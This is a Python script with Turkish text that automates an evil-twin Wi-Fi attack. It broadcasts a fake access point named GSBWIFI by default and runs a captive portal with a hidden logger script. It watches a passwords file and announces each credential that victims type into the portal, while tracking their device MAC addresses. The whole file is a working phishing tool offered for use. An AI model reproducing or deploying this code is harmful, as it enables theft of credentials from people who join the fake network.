import subprocess
import os
import time
import signal
import sys
import threading
import re
import argparse
from datetime import datetime

# --- AYARLAR & RENKLER ---
GREEN, RED, YELLOW, CYAN, NC = '\033[0;32m', '\033[0;31m', '\033[1;33m', '\033[0;36m', '\033[0m'
PASS_FILE = "/etc/nodogsplash/passwords.txt"
LOGGER_PATH = "/etc/nodogsplash/htdocs/resources/images/logger.py"
LOG_FILE = "gsb_activity.log"
print_lock = threading.Lock()
active_clients = set() 

# --- BAĞIMLILIKLAR ---
REQUIRED_PACKAGES = ["create_ap", "nodogsplash", "dnsmasq", "python3", "fuser", "iw"]

# --- ARGÜMAN YÖNETİMİ ---
parser = argparse.ArgumentParser(description='GSB-WIFI Otomasyon Paneli')
parser.add_argument('-i', '--interface', help='Yayın yapılacak Wi-Fi kartı')
parser.add_argument('-s', '--ssid', default='GSBWIFI', help='Yayınlanacak ağ adı')
args = parser.parse_args()

def write_to_log(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clean_msg = re.sub(r'\033\[[0-9;]*m', '', message) # Renkleri temizle
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {clean_msg}\n")

def safe_print(msg, log_it=True):
    with print_lock:
        sys.stdout.write(f"\r\033[K{msg}\n")
        sys.stdout.flush()
    if log_it:
        write_to_log(msg)

def check_dependencies():
    missing = []
    for pkg in REQUIRED_PACKAGES:
        check = subprocess.run(["which", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if check.returncode != 0:
            missing.append(pkg)
    if missing:
        print(f"{RED}[!] HATA: Eksik paketler: {', '.join(missing)}{NC}")
        print(f"{YELLOW}[*] Yüklemek için: {NC}sudo apt update && sudo apt install {' '.join(missing)}")
        sys.exit(1)

def clean_exit(sig, frame):
    sys.stdout.write(f"\r\033[K{YELLOW}[!] Çıkılıyor...{NC}\n")
    sys.stdout.flush()
    write_to_log("OPERASYON DURDURULDU.")
    
    DEVNULL = subprocess.DEVNULL
    subprocess.run(["sudo", "pkill", "-9", "-f", "nodogsplash"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "pkill", "-9", "-f", "create_ap"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "pkill", "-9", "-f", "logger.py"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "pkill", "-9", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "fuser", "-k", "53/udp"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "fuser", "-k", "53/tcp"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "ip", "addr", "flush", "dev", "lo"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "ip", "addr", "add", "127.0.0.1/8", "dev", "lo"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "ip", "link", "set", "lo", "up"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "systemctl", "reset-failed", "systemd-resolved"], stdout=DEVNULL, stderr=DEVNULL)
    subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], stdout=DEVNULL, stderr=DEVNULL)
    time.sleep(1)
    subprocess.run(["sudo", "systemctl", "start", "systemd-resolved"], stdout=DEVNULL, stderr=DEVNULL)
    
    os.system('stty sane')
    sys.stdout.write(f"{GREEN}[+] Bitti.{NC}\n")
    sys.stdout.flush()
    os._exit(0)

signal.signal(signal.SIGINT, clean_exit)

def get_interfaces():
    try:
        output = subprocess.check_output(["iw", "dev"], text=True)
        return re.findall(r"Interface\s+(.+)", output)
    except: return []

def password_watcher():
    if not os.path.exists(PASS_FILE): open(PASS_FILE, 'a').close()
    with open(PASS_FILE, "r") as f:
        f.seek(0, os.SEEK_END)
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.5)
                continue
            # Şifre düştüğündeki o kutucuk formatı
            safe_print(f"{RED}[!!!] ŞİFRE DÜŞTÜ:{NC}")
            safe_print(f"{GREEN}  > {line.strip()}{NC}")
            safe_print(f"{CYAN}----------------------------------------------{NC}")

def run():
    check_dependencies()
    ifaces = get_interfaces()
    all_sys_ifaces = os.listdir('/sys/class/net')

    os.system('clear')
    write_to_log("--- YENİ OPERASYON BAŞLATILDI ---")
    print(f"{CYAN}=============================================={NC}")
    print(f"{YELLOW}          GSB-WIFI YÖNETİCİ PANELİ             {NC}")
    print(f"{CYAN}=============================================={NC}")

    if args.interface:
        INTERFACE = args.interface
    else:
        if not ifaces: return
        for i, iface in enumerate(ifaces): print(f"  {i+1}) {iface}")
        idx1 = int(input("Yayın Kartı Seçin: ")) - 1
        INTERFACE = ifaces[idx1]

    INTERNET_INT = "lo"
    for iface in all_sys_ifaces:
        if iface != INTERFACE and iface != "lo":
            INTERNET_INT = iface
            break

    os.system('clear')
    print(f"{CYAN}=============================================={NC}")
    print(f"{YELLOW}          GSB-WIFI OPERASYON PANELI             {NC}")
    print(f"{CYAN}=============================================={NC}")
    safe_print(f"[*] SSID  : {GREEN}{args.ssid}{NC}")
    safe_print(f"[*] Yayın : {GREEN}{INTERFACE}{NC}")
    safe_print(f"[*] Kaynak: {YELLOW}{INTERNET_INT}{NC}")

    subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "-f", "logger.py"], stderr=subprocess.DEVNULL)
    subprocess.Popen(["sudo", "python3", LOGGER_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    cmd = ["sudo", "create_ap", "--no-virt", "-m", "nat", INTERFACE, INTERNET_INT, args.ssid]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

    time.sleep(4) 
    subprocess.run(["sudo", "systemctl", "restart", "dnsmasq"], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "nodogsplash"], stderr=subprocess.DEVNULL)
    subprocess.Popen(["sudo", "nodogsplash"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(1)
    safe_print(f"{GREEN}[!] SİSTEM HAZIR. Dinleniyor...{NC}")
    safe_print(f"{CYAN}----------------------------------------------{NC}", log_it=False)

    threading.Thread(target=password_watcher, daemon=True).start()

    while True:
        line = proc.stdout.readline()
        if not line: break
        mac_m = re.search(r'([a-fA-F0-9]{2}[:|\-]){5}[a-fA-F0-9]{2}', line)
        if mac_m:
            mac = mac_m.group().lower()
            if any(x in line.lower() for x in ["disconn", "disassoc", "deauth", "expired", "removed"]):
                if mac in active_clients:
                    active_clients.remove(mac)
                    safe_print(f"{RED}[-] BAĞLANTI KESİLDİ: {mac}{NC}")
            elif any(x in line.lower() for x in ["assoc", "auth", "connected", "dhcpack"]):
                if "dis" not in line.lower() and mac not in active_clients:
                    active_clients.add(mac)
                    safe_print(f"{YELLOW}[+] YENİ BAĞLANTI: {mac}{NC}")

if __name__ == "__main__":
    run()
